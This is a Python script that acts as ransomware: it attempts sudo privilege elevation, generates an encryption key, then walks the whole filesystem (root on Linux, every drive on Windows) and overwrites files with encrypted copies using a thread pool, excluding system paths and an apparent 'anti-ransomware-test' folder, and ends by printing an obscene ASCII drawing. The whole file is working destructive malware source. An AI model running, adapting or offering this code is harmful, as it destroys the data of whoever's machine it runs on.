import os
import sys
import subprocess
import platform
import logging
import signal
import time
import psutil
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor, as_completed

def setup_logging():
    """
    Set up logging configuration.
    """
    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s - %(levelname)s - %(message)s',
                        handlers=[logging.StreamHandler()])

def elevate_privileges_if_needed():
    """
    Elevate privileges if running on Linux and not as root.
    """
    if platform.system() == "Linux" and os.geteuid() != 0:
        logging.info("Not running as root. Attempting to elevate privileges...")
        try:
            subprocess.run(['sudo', 'python3'] + sys.argv)
            sys.exit(0)
        except Exception as e:
            logging.error(f"Privilege elevation failed: {e}")
            sys.exit(1)
    elif platform.system() == "Windows":
        logging.info("Please run as administrator.")
        #sys.exit(1)

def generate_encryption_key():
    """
    Generate a new encryption key and save it to a file.
    """
    key = Fernet.generate_key()
    with open("encryption.key", "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_file(file_path, key, exclude_paths):
    """
    Encrypt a file using the provided encryption key, excluding specified paths.
    """
    abs_file_path = os.path.abspath(file_path)
    if any(abs_file_path.startswith(exclude) for exclude in exclude_paths):
        logging.debug(f"Excluded: {file_path}")
        return
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        encrypted_data = Fernet(key).encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        logging.info(f"Encrypted: {file_path}")
    except Exception as e:
        logging.error(f"Encryption failed for {file_path}: {e}")

def find_files_to_encrypt(root_dir, exclude_paths):
    """
    Find files to encrypt in the specified root directory, excluding specified paths.
    """
    for root, dirs, files in os.walk(root_dir):
        abs_root = os.path.abspath(root)
        dirs[:] = [d for d in dirs if not any(os.path.join(abs_root, d).startswith(exclude) for exclude in exclude_paths)]
        for file in files:
            file_path = os.path.join(root, file)
            abs_file_path = os.path.abspath(file_path)
            if not any(abs_file_path.startswith(exclude) for exclude in exclude_paths):
                yield file_path

def handle_bus_error(signum, frame):
    """
    Handle bus error signal.
    """
    logging.error(f"Bus error (signal {signum}).")
    time.sleep(1)

def encrypt_files_with_resource_checks(root_dir, key, exclude_paths, chunk_size=100):
    """
    Encrypt files in the specified root directory with resource checks, excluding specified paths.
    """
    files = find_files_to_encrypt(root_dir, exclude_paths)
    file_chunk = []
    
    for file in files:
        file_chunk.append(file)
        if len(file_chunk) >= chunk_size:
            process_file_chunk(file_chunk, key, exclude_paths)
            file_chunk = []
    
    if file_chunk:
        process_file_chunk(file_chunk, key, exclude_paths)

def process_file_chunk(file_chunk, key, exclude_paths):
    """
    Process a chunk of files, encrypting them with the provided encryption key and excluding specified paths.
    """
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
    cpu_usage = psutil.cpu_percent(interval=1)
    logging.debug(f"Available memory: {available_memory:.2f}%, CPU usage: {cpu_usage:.2f}%")
    
    if available_memory < 20:
        logging.warning("Low memory. Pausing encryption for 5 seconds...")
        time.sleep(5)
    
    with ThreadPoolExecutor() as executor:
        futures = {executor.submit(encrypt_file, file, key, exclude_paths): file for file in file_chunk}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logging.error(f"Error encrypting file: {e}")

def main():
    """
    Main function to run the encryption process.
    """
    setup_logging()
    elevate_privileges_if_needed()
    key = generate_encryption_key()
    
    # Convert exclude_paths to absolute paths
    script_dir = os.path.abspath(os.path.dirname(__file__))
    exclude_files = ["main.py", "encryption.key", "ransom.sh"]
    exclude_paths = {os.path.join(script_dir, file) for file in exclude_files}

    # Determine the absolute path of the `anti-ransomware-test` directory relative to the script's location
    relative_path_to_exclude = os.path.join(script_dir, "..", "anti-ransomware-test")
    absolute_path_to_exclude = os.path.abspath(relative_path_to_exclude)
    exclude_paths.add(absolute_path_to_exclude)
    
    system_paths = ["/usr", "/var", "/opt", "/dev", "/proc", "/sys", "/venv", "/workspaces", "/.codespaces", "/vscode", "/snap", "/boot", "/run", "/etc"]
    exclude_paths.update([os.path.abspath(path) for path in system_paths])
    
    logging.debug(f"Exclude paths: {exclude_paths}")
    
    if platform.system() == "Linux":
        signal.signal(signal.SIGBUS, handle_bus_error)
        root_dirs = ["/"]
    else:
        root_dirs = [f"{chr(drive)}:\\" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:\\")]
    
    for root_dir in root_dirs:
        encrypt_files_with_resource_checks(root_dir, key, exclude_paths)

if __name__ == "__main__":
    main()






    bird = """

    ░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ██████▄███▄████░░███▄░░░░░░░
    ▓▓▓▓▓▓█░░░█░░░█░░█░░░███░░░░
    ▓▓▓▓▓▓█░░░█░░░█░░█░░░█░░█░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░█░░█░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░░░█░░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░██░░░░░
    ▓▓▓▓▓▓█████░░░░░░░░░██░░░░░
    █████▀░░░░▀▀████████░░░░░░


    """
    print(bird)

    
